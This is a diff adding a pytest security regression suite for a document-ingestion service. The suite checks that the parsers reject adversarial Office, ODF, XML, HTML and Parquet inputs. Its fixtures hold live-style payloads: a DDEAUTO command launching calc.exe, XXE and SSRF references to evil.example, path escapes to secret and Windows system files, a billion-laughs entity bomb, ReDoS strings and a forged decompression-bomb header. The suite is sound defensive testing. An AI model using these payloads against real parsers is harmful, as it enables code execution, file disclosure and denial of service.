@@ -2102,3 +2102,427 @@ class TestIngestionServiceMultiFormatIntegration:
         text16, enc16 = decode_text_payload(utf16_bom, filename="utf16.md")
         assert "UTF-16 Title" in text16
         assert enc16 == "utf-16"
+
+
+# =============================================================================
+# 8. Round-4 Adversarial Security & Fidelity Regression Suite (P04a & P04b)
+# =============================================================================
+
+
+class TestRound4AdversarialHardening:
+    """Adversarial regression tests for P04a & P04b Opus 5.5 security and fidelity fixes."""
+
+    @staticmethod
+    def _make_raw_zip(entries: list[tuple[str, bytes]]) -> bytes:
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, mode="w", compression=zipfile.ZIP_DEFLATED) as zf:
+            for name, content in entries:
+                zf.writestr(name, content)
+        return buf.getvalue()
+
+    def test_libreoffice_linear_time_html_and_xml_no_redos(self) -> None:
+        """Regression P04a::MAJ-01: Unclosed <!DOCTYPE / <meta tags scan in O(L) linear time."""
+        adapter = LibreOfficeDocumentAdapter(soffice_path="mock_soffice")
+        unclosed_html = (
+            b'<!DOCTYPE html PUBLIC "'
+            + (b"<!DOCTYPE " * 12_500)
+            + (b'<meta http-equiv="refresh" ' * 12_500)
+        )
+        docx_html = self._make_raw_zip(
+            [
+                ("word/afchunk.html", unclosed_html),
+            ]
+        )
+        t0 = time.perf_counter()
+        with (
+            patch(
+                "opendv_sources.adapters.libreoffice_adapter.find_soffice_binary",
+                return_value="mock_soffice",
+            ),
+            patch("subprocess.Popen") as mock_popen,
+            pytest.raises(ArchiveSecurityViolationError),
+        ):
+            adapter.parse_bytes(docx_html, filename="redos_html.docx")
+        elapsed = time.perf_counter() - t0
+        assert elapsed < 1.0, f"HTML security scan took {elapsed:.2f}s (expected linear < 1.0s)"
+        mock_popen.assert_not_called()
+
+        unclosed_xml = b"<?xml version='1.0'?><root>" + (b"<!DOCTYPE " * 25_000)
+        docx_xml = self._make_raw_zip([("word/document.xml", unclosed_xml)])
+        t1 = time.perf_counter()
+        with (
+            patch(
+                "opendv_sources.adapters.libreoffice_adapter.find_soffice_binary",
+                return_value="mock_soffice",
+            ),
+            patch("subprocess.Popen") as mock_popen_xml,
+            pytest.raises(ArchiveSecurityViolationError),
+        ):
+            adapter.parse_bytes(docx_xml, filename="redos_xml.docx")
+        elapsed_xml = time.perf_counter() - t1
+        assert elapsed_xml < 1.0, f"XML scan took {elapsed_xml:.2f}s (expected linear < 1.0s)"
+        mock_popen_xml.assert_not_called()
+
+    def test_libreoffice_non_xml_extension_opc_and_odf_bypass_blocked(self) -> None:
+        """Regression P04a::MAJ-02, MIN-01, MIN-04, MIN-10: Inspect non-.xml OPC/ODF parts."""
+        from opendv_sources.adapters.libreoffice_adapter import _HARDENED_REGISTRYMODIFICATIONS_XCU
+
+        assert (
+            '<prop oor:name="Link" oor:op="fuse">\n      <value>2</value>'
+            in _HARDENED_REGISTRYMODIFICATIONS_XCU
+        )
+        assert find_soffice_binary(custom_path="/definitely/nonexistent/soffice_bin") is None
+
+        wml_dde = (
+            '<?xml version="1.0" encoding="UTF-8"?>'
+            '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
+            "<w:body><w:p><w:r><w:instrText>"
+            'DDEAUTO cmd "/c calc.exe"'
+            "</w:instrText></w:r></w:p></w:body></w:document>"
+        )
+        rels_to_dat = (
+            b'<?xml version="1.0" encoding="UTF-8"?>'
+            b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
+            b'<Relationship Id="rId1" '
+            b'Type="http://schemas.openxmlformats.org/officeDocument/2006/'
+            b'relationships/officeDocument" '
+            b'Target="word/document.dat"/>'
+            b"</Relationships>"
+        )
+
+        # 1) Mapped via [Content_Types].xml <Default Extension="dat" .../>
+        ct_default_dat = (
+            b'<?xml version="1.0" encoding="UTF-8"?>'
+            b'<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
+            b'<Default Extension="rels" '
+            b'ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
+            b'<Default Extension="dat" ContentType="application/vnd.openxmlformats-'
+            b'officedocument.wordprocessingml.document.main+xml"/>'
+            b"</Types>"
+        )
+        # 2) Case-insensitive <Override PartName="/Word/Document.dat" .../> with XXE DTD
+        ct_override_dat = (
+            b'<?xml version="1.0" encoding="UTF-8"?>'
+            b'<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
+            b'<Override PartName="/Word/Document.dat" '
+            b'ContentType="application/vnd.openxmlformats-officedocument.'
+            b'wordprocessingml.document.main+xml"/>'
+            b"</Types>"
+        )
+        xxe_dat = (
+            b'<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://evil.example/xxe"><foo>1</foo>'
+        )
+        # 3) No [Content_Types].xml at all + 80,000 whitespace bytes + UTF-16LE BOM before WML
+        padded_utf16_wml = b"\xff\xfe" + (" " * 40_000 + wml_dde[38:]).encode("utf-16-le")
+        # 4) afChunk pointing to .bin with HTML SSRF image
+        rels_afchunk_bin = (
+            b'<?xml version="1.0" encoding="UTF-8"?>'
+            b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
+            b'<Relationship Id="rId2" '
+            b'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/aFChunk" '
+            b'Target="chunk.bin"/>'
+            b"</Relationships>"
+        )
+        # 5) Duplicate / case-colliding ZIP entries attempting to shadow word/document.xml
+        benign_wml = (
+            b'<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
+            b"<w:body><w:p><w:r><w:t>Safe</w:t></w:r></w:p></w:body></w:document>"
+        )
+        # 6) ODF local path escapes (/etc/passwd, ../../secret.png, C:\secret.png)
+        odf_ns = (
+            'xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" '
+            'xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" '
+            'xmlns:xlink="http://www.w3.org/1999/xlink"'
+        )
+
+        adversarial_archives: list[tuple[str, list[tuple[str, bytes]]]] = [
+            (
+                "opc_default_dat.docx",
+                [
+                    ("[Content_Types].xml", ct_default_dat),
+                    ("_rels/.rels", rels_to_dat),
+                    ("word/document.dat", wml_dde.encode("utf-8")),
+                ],
+            ),
+            (
+                "opc_override_xxe.docx",
+                [
+                    ("[Content_Types].xml", ct_override_dat),
+                    ("word/document.dat", xxe_dat),
+                ],
+            ),
+            (
+                "opc_no_ct_padded_utf16.docx",
+                [
+                    ("_rels/.rels", rels_to_dat),
+                    ("word/document.dat", padded_utf16_wml),
+                ],
+            ),
+            (
+                "opc_afchunk_bin.docx",
+                [
+                    ("word/_rels/document.xml.rels", rels_afchunk_bin),
+                    ("word/chunk.bin", b'<html><body><img src="http://evil.example/p.png"></body>'),
+                ],
+            ),
+            (
+                "duplicate_shadow.docx",
+                [
+                    ("word/document.xml", benign_wml),
+                    ("WORD/document.xml", wml_dde.encode("utf-8")),
+                ],
+            ),
+            (
+                "odf_abs_path.odt",
+                [
+                    (
+                        "content.xml",
+                        (
+                            f"<office:document-content {odf_ns}><office:body>"
+                            '<draw:image xlink:href="/home/svc/secret.png"/>'
+                            "</office:body></office:document-content>"
+                        ).encode(),
+                    )
+                ],
+            ),
+            (
+                "odf_rel_escape.odt",
+                [
+                    (
+                        "Pictures/sub/content.xml",
+                        (
+                            f"<office:document-content {odf_ns}><office:body>"
+                            '<draw:image xlink:href="../../../secret.png"/>'
+                            "</office:body></office:document-content>"
+                        ).encode(),
+                    )
+                ],
+            ),
+            (
+                "odf_drive_path.odt",
+                [
+                    (
+                        "content.xml",
+                        (
+                            f"<office:document-content {odf_ns}><office:body>"
+                            r'<draw:image xlink:href="C:\Windows\win.ini"/>'
+                            "</office:body></office:document-content>"
+                        ).encode(),
+                    )
+                ],
+            ),
+        ]
+
+        adapter = LibreOfficeDocumentAdapter(soffice_path="mock_soffice")
+        with (
+            patch(
+                "opendv_sources.adapters.libreoffice_adapter.find_soffice_binary",
+                return_value="mock_soffice",
+            ),
+            patch("subprocess.Popen") as mock_popen,
+        ):
+            for fname, entries in adversarial_archives:
+                with pytest.raises(ArchiveSecurityViolationError) as exc_info:
+                    adapter.parse_bytes(self._make_raw_zip(entries), filename=fname)
+                assert exc_info.value.error_code == ErrorCode.ARCHIVE_SECURITY_VIOLATION
+            mock_popen.assert_not_called()
+
+    def test_liteparse_fallback_reason_provenance_and_413_error(self) -> None:
+        """Regression P04a::MIN-05, MIN-06: Enforce HTTP 413 on max_bytes and provenance."""
+        import pypdf
+
+        from opendv_contracts.errors import PayloadTooLargeError
+        from opendv_sources.exceptions import DocumentPayloadTooLargeError
+
+        tiny_pdf_adapter = LiteParseDocumentAdapter(max_bytes=16)
+        with pytest.raises(DocumentPayloadTooLargeError) as exc_413:
+            tiny_pdf_adapter.parse_bytes(b"%PDF-1.4\n" + b"0" * 32, filename="oversized.pdf")
+        assert isinstance(exc_413.value, PayloadTooLargeError)
+        assert exc_413.value.http_status == 413
+
+        pdf_buf = io.BytesIO()
+        writer = pypdf.PdfWriter()
+        writer.add_blank_page(width=200, height=200)
+        writer.write(pdf_buf)
+        adapter = LiteParseDocumentAdapter()
+        res = adapter.parse_bytes(
+            pdf_buf.getvalue(),
+            filename="clean.pdf",
+            metadata={"fallback_reason": "caller_spoofed_reason", "source_tag": "kept"},
+        )
+        assert "fallback_reason" not in res.metadata
+        assert res.metadata["source_tag"] == "kept"
+
+    def test_parquet_forged_page_header_blocked_before_iter_batches(self) -> None:
+        """Regression P04b::MAJ-01: PageHeader pre-scan blocks forged sizes before Arrow decode."""
+        from opendv_sources.adapters.multiformat_adapter import _parse_parquet_page_header
+
+        def _zigzag_varint(n: int) -> bytes:
+            zz = (n << 1) ^ (n >> 63)
+            out = bytearray()
+            while zz >= 0x80:
+                out.append((zz & 0x7F) | 0x80)
+                zz >>= 7
+            out.append(zz)
+            return bytes(out)
+
+        tbl = pa.Table.from_pydict({"payload": [f"row_{i}_" + ("Q" * 64) for i in range(64)]})
+        buf = io.BytesIO()
+        pq.write_table(tbl, buf, use_dictionary=False, compression="gzip")
+        valid_pq = buf.getvalue()
+
+        pf = pq.ParquetFile(io.BytesIO(valid_pq))
+        col0 = pf.metadata.row_group(0).column(0)
+        page_off = col0.data_page_offset
+        _, _, orig_comp_sz, hdr_end = _parse_parquet_page_header(
+            valid_pq, page_off, len(valid_pq), "valid.parquet"
+        )
+        assert valid_pq[page_off : page_off + 3] == b"\x15\x00\x15"
+        v_idx = page_off + 3
+        while valid_pq[v_idx] & 0x80:
+            v_idx += 1
+        v_idx += 1
+        assert valid_pq[v_idx] == 0x15
+        c_idx = v_idx + 1
+        while valid_pq[c_idx] & 0x80:
+            c_idx += 1
+        c_idx += 1
+
+        forged_uncomp = _zigzag_varint(300_000_000)
+        delta_f2 = len(forged_uncomp) - (v_idx - (page_off + 3))
+        new_comp_varint = _zigzag_varint(orig_comp_sz - delta_f2)
+        total_hdr_delta = delta_f2 + (len(new_comp_varint) - (c_idx - (v_idx + 1)))
+        new_comp_varint = _zigzag_varint(orig_comp_sz - total_hdr_delta)
+        final_hdr_delta = delta_f2 + (len(new_comp_varint) - (c_idx - (v_idx + 1)))
+        forged_pq = (
+            valid_pq[: page_off + 3]
+            + forged_uncomp
+            + b"\x15"
+            + new_comp_varint
+            + valid_pq[c_idx:hdr_end]
+            + valid_pq[hdr_end : hdr_end + orig_comp_sz - final_hdr_delta]
+            + valid_pq[hdr_end + orig_comp_sz :]
+        )
+        assert len(forged_pq) == len(valid_pq)
+
+        with (
+            patch.object(
+                pq.ParquetFile,
+                "iter_batches",
+                side_effect=AssertionError("iter_batches MUST NOT execute on forged PageHeader"),
+            ),
+            pytest.raises(
+                ArchiveSecurityViolationError, match="exhibits extreme compression ratio"
+            ),
+        ):
+            PyArrowTabularAdapter().parse_bytes(forged_pq, filename="forged_page_hdr.parquet")
+
+        with (
+            patch.object(
+                pq.ParquetFile,
+                "iter_batches",
+                side_effect=AssertionError("iter_batches MUST NOT execute on forged PageHeader"),
+            ),
+            pytest.raises(ArchiveSecurityViolationError, match="PageHeader uncompressed_page_size"),
+        ):
+            PyArrowTabularAdapter(max_uncompressed_bytes=64 * 1024 * 1024).parse_bytes(
+                forged_pq, filename="forged_page_hdr_cap.parquet"
+            )
+
+        # Valid single-page column whose first-page uncompressed size > max_preview_memory_bytes
+        big_page_tbl = pa.Table.from_pydict({"blob": ["W" * 1024 for _ in range(32)]})
+        big_buf = io.BytesIO()
+        pq.write_table(big_page_tbl, big_buf, use_dictionary=False)
+        with (
+            patch(
+                "opendv_sources.adapters.multiformat_adapter.MAX_PARQUET_PREVIEW_MEMORY_BYTES_CAP",
+                4096,
+            ),
+            patch.object(
+                pq.ParquetFile,
+                "iter_batches",
+                side_effect=AssertionError("iter_batches MUST NOT run when first page > cap"),
+            ),
+            pytest.raises(ArchiveSecurityViolationError, match="exceeds preview memory cap"),
+        ):
+            PyArrowTabularAdapter(preview_rows=5).parse_bytes(
+                big_buf.getvalue(), filename="huge_first_page.parquet"
+            )
+
+    def test_multiformat_xml_order_xxe_html_nested_tables_ragged_padding_and_md_offsets(
+        self,
+    ) -> None:
+        """Regression P04b::MIN-01..06, MIN-08: Document order, XXE block, ragged tables, MD."""
+        from opendv_sources.exceptions import DocumentPayloadTooLargeError
+
+        with pytest.raises(DocumentPayloadTooLargeError) as exc_dec:
+            decode_text_payload(b"0123456789ABCDEF", filename="oversized.txt", max_bytes=8)
+        assert exc_dec.value.http_status == 413
+
+        # 1) Mixed-content XML preserves document order (x -> y -> T -> z) and blocks <!ENTITY>
+        markup = MarkupDocumentAdapter()
+        xml_res = markup.parse_bytes(
+            b"<r><a>x<c>y</c></a>T<b>z</b></r>", filename="mixed_order.xml"
+        )
+        assert [seg.strip() for seg in xml_res.normalized_text.splitlines() if seg.strip()] == [
+            "x",
+            "y",
+            "T",
+            "z",
+        ]
+
+        billion_laughs = (
+            b'<?xml version="1.0"?>'
+            b'<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]>'
+            b"<lolz>&lol2;</lolz>"
+        )
+        with pytest.raises(ArchiveSecurityViolationError):
+            markup.parse_bytes(billion_laughs, filename="laughs.xml")
+
+        # 2) Nested HTML <table>, ragged row padding, and unclosed <nav> fallback recovery
+        nested_html = (
+            b"<html><body>"
+            b"<table><tr><th>OuterA</th><th>OuterB</th><th>OuterC</th></tr>"
+            b"<tr><td>1</td><td>"
+            b"<table><tr><th>In1</th><th>In2</th></tr><tr><td>x</td></tr></table>"
+            b"</td></tr></table></body></html>"
+        )
+        html_res = markup.parse_bytes(nested_html, filename="nested.html")
+        assert len(html_res.tables) == 2
+        inner_tbl, outer_tbl = html_res.tables[0], html_res.tables[1]
+        assert inner_tbl.headers == ["In1", "In2"]
+        assert inner_tbl.rows == [["x", ""]]
+        assert outer_tbl.headers == ["OuterA", "OuterB", "OuterC"]
+        assert len(outer_tbl.rows[0]) == 3 and outer_tbl.rows[0][2] == ""
+
+        unclosed_nav_html = (
+            b"<html><body><nav>Menu<main><p>Important Body Text</p></main></body></html>"
+        )
+        nav_res = markup.parse_bytes(unclosed_nav_html, filename="unclosed_nav.html")
+        assert "Important Body Text" in nav_res.normalized_text
+        assert nav_res.metadata["unclosed_ignored_tag_recovered"] is True
+
+        # 3) Ragged CSV row padding to len(headers)
+        csv_res = DelimitedTabularAdapter().parse_bytes(
+            b"h1,h2,h3\nv1\nv2,v3,v4,v5\n", filename="ragged.csv"
+        )
+        assert csv_res.tables[0].headers == ["h1", "h2", "h3"]
+        assert csv_res.tables[0].rows == [["v1", "", ""], ["v2", "v3", "v4"]]
+
+        # 4) Markdown exclude_code_blocks=True keeps heading char offsets aligned
+        md_doc = (
+            b"# Intro\n\n```python\nprint('hidden code block')\n```\n\n## Second Section\n\nBody.\n"
+        )
+        md_res = MarkdownDocumentAdapter(exclude_code_blocks=True).parse_bytes(
+            md_doc, filename="aligned.md"
+        )
+        headings = md_res.metadata["headings"]
+        assert len(headings) == 2
+        for h in headings:
+            sliced = md_res.normalized_text[h["start_char"] : h["end_char"]]
+            assert h["title"] in sliced
+
+        # 5) YAML plain-scalar apostrophe followed by block scalar does not corrupt quote state
+        yaml_doc = b"title: Don't panic\nnotes: |\n  - item one\n  - item two\ncount: 2\n"
+        yaml_res = StructuredDataDocumentAdapter().parse_bytes(yaml_doc, filename="apostrophe.yaml")
+        assert "Don't panic" in yaml_res.normalized_text
